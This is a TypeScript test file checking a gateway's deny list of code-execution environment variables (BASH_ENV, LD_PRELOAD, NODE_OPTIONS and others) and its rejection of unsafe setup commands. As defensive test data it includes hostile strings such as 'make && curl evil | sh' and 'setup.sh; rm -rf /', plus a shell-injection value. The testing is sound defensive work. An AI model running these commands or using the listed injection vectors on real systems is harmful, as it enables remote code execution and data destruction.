import { describe, expect, it } from "vitest";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { checkSetup, isEnvNameAllowed, partitionEnv } from "./policy.js";
import { buildOpenCodeCommand } from "./opencode.js";
import { gatewaySrc } from "./testkit/src.js";

const here = dirname(fileURLToPath(import.meta.url));
const index = gatewaySrc();

describe("issue #34: env policy", () => {
  it("allows ordinary variables", () => {
    for (const k of ["CI", "API_BASE_URL", "OPENAI_API_KEY", "GOPROXY", "GIT_AUTHOR_NAME", "TZ", "_x"]) {
      expect(isEnvNameAllowed(k)).toBe(true);
    }
  });
  it("denies code-execution and config-redirect vectors, case-insensitively", () => {
    const bad = [
      "BASH_ENV", "ENV", "PROMPT_COMMAND", "NODE_OPTIONS", "PYTHONSTARTUP", "RUBYOPT", "JAVA_TOOL_OPTIONS",
      "LD_PRELOAD", "LD_AUDIT", "DYLD_INSERT_LIBRARIES", "GIT_SSH_COMMAND", "GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0",
      "GIT_ASKPASS", "GIT_EXEC_PATH", "EDITOR", "XDG_CONFIG_HOME", "OPENCODE_CONFIG", "OPENCODE_PERMISSION",
      "PATH", "HOME", "BASH_FUNC_foo%%", "bash_env", "ld_preload",
    ];
    for (const k of bad) expect(isEnvNameAllowed(k)).toBe(false);
  });
  it("rejects malformed names and object values", () => {
    for (const k of ["1X", "A-B", "A B", "", "A=B", "A;rm"]) expect(isEnvNameAllowed(k)).toBe(false);
    expect(partitionEnv({ OK: "1", NESTED: { a: 1 } as unknown as string }).rejected).toEqual(["NESTED"]);
  });
  it("partitionEnv reports refused names instead of dropping them", () => {
    const r = partitionEnv({ CI: "1", BASH_ENV: "/tmp/x", NODE_OPTIONS: "--require y" });
    expect(r.allowed).toEqual({ CI: "1" });
    expect(r.rejected).toEqual(["BASH_ENV", "NODE_OPTIONS"]);
  });
  it("buildOpenCodeCommand never exports a denied name even if a caller bypasses the gateway", () => {
    const cmd = buildOpenCodeCommand({
      prompt: "x", cwd: "/home/u/p", transport: "http",
      env: { CI: "1", BASH_ENV: "/tmp/evil", LD_PRELOAD: "/x.so" },
    });
    expect(cmd).toContain("export CI='1'");
    expect(cmd).not.toContain("BASH_ENV");
    expect(cmd).not.toContain("LD_PRELOAD");
  });
  it("values are shell-quoted", () => {
    const cmd = buildOpenCodeCommand({ prompt: "x", cwd: "/h/p", transport: "http", env: { MSG: "a'; rm -rf / #" } });
    expect(cmd).toContain(`export MSG='a'\\''; rm -rf / #'`);
  });
});

describe("issue #34: setup policy", () => {
  it("accepts repo-relative scripts with plain arguments", () => {
    for (const s of ["scripts/setup.sh", "./setup.sh", "./setup.sh --fast", "scripts/s.sh env=dev x:1", ""]) {
      expect(checkSetup(s).ok).toBe(true);
    }
  });
  it("rejects shell metacharacters, absolute paths and traversal by default", () => {
    const bad = [
      "make && curl evil | sh", "setup.sh; rm -rf /", "$(id)", "`id`", "a | b", "a > /etc/x", "/usr/bin/evil",
      "../outside.sh", "scripts/../../x.sh", "-rf", "setup.sh \"quoted\"", "sh -c id", "bash -c id", "python3 -c x", "env FOO=1 ./x.sh", "setup.sh", "node -e 1", "python3 -m venv .venv && .venv/bin/pip install -r r.txt",
    ];
    for (const s of bad) expect(checkSetup(s).ok, s).toBe(false);
  });
  it("allowCommands opens the channel for the operator", () => {
    expect(checkSetup("python3 -m venv .venv && .venv/bin/pip install -r requirements.txt", true).ok).toBe(true);
  });
});

describe("issue #34: wiring", () => {
  it("fleet_dispatch refuses denied env and honors the autoApprove ceiling before any invoke", () => {
    expect(index).toContain("partitionEnv(p.env, cfg.env)");
    expect(index).toContain("allowAutoApprove === false");
    expect(index.indexOf("partitionEnv(p.env, cfg.env)")).toBeLessThan(index.indexOf("const results: Record<string, unknown> = {};"));
  });
  it("fleet_provision checks setup before creating the bundle, and provision re-checks", () => {
    expect(index.indexOf("checkSetup(p.setup")).toBeLessThan(index.indexOf("createRepoBundle({"));
    expect(readFileSync(join(here, "provision.ts"), "utf8")).toContain("checkSetup(req.setup");
  });
  it("both config schemas expose the new switches", () => {
    const manifest = readFileSync(join(here, "..", "openclaw.plugin.json"), "utf8");
    for (const k of ["allowAutoApprove", "allowSetupCommands"]) {
      expect(index).toContain(k);
      expect(manifest).toContain(k);
    }
  });
});

describe("issue #34: review follow-ups", () => {
  it("a bare interpreter or PATH-resolved name cannot pass as a script path", () => {
    for (const s of ["sh -c id", "bash -c id", "perl -e 1", "make install", "setup.sh"]) expect(checkSetup(s).ok, s).toBe(false);
    expect(checkSetup("./setup.sh").ok).toBe(true);
  });
  it("__proto__ is an ordinary name: allowed with its value or rejected by name, never dropped", () => {
    const env = JSON.parse('{"__proto__": "x", "CI": "1"}');
    const r = partitionEnv(env);
    const seen = [...Object.keys(r.allowed), ...r.rejected];
    expect(seen.sort()).toEqual(["CI", "__proto__"]);
    expect(Object.getPrototypeOf(r.allowed)).toBeNull();
  });
  it("more program-launching variables are denied", () => {
    for (const k of ["LESSOPEN", "RUSTC_WRAPPER", "GOFLAGS", "MAKEFLAGS", "CARGO_TARGET_X86_64_LINKER", "NPM_CONFIG_SCRIPT_SHELL"]) {
      expect(isEnvNameAllowed(k), k).toBe(false);
    }
  });
  it("operator config: allowOnly narrows to a list; extraDeny adds names; built-in denials still win", () => {
    expect(isEnvNameAllowed("CI", { allowOnly: ["CI"] })).toBe(true);
    expect(isEnvNameAllowed("TZ", { allowOnly: ["CI"] })).toBe(false);
    expect(isEnvNameAllowed("BASH_ENV", { allowOnly: ["BASH_ENV"] })).toBe(false);
    expect(isEnvNameAllowed("MY_SECRET_HOOK", { extraDeny: ["my_secret_hook"] })).toBe(false);
    expect(partitionEnv({ CI: "1", TZ: "UTC" }, { allowOnly: ["CI"] })).toMatchObject({ rejected: ["TZ"] });
  });
  it("tool descriptions no longer advertise silent filtering or a rejected example", () => {
    expect(index).not.toContain("are ignored for safety");
    expect(index).not.toMatch(/e\.g\. \\"scripts\/setup\.sh\\" or \\"python3 -m venv/);
  });
});
